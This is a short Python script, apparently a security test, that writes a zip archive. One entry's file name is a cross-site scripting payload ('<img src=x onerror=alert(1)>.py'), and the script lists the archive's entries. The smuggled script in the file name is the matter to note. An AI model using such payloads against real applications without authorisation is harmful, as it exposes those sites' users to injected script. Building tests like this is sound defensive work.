import sys
import zipfile

out_path = sys.argv[1] if len(sys.argv) > 1 else "xss_test.zip"
payload_name = '<img src=x onerror=alert(1)>.py'

with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr(payload_name, "print('xss filename test')\n")
    zf.writestr("safe_file.py", "print('safe')\n")

with zipfile.ZipFile(out_path, "r") as zf:
    for info in zf.infolist():
        print("ENTRY:", repr(info.filename))
print("WROTE:", out_path)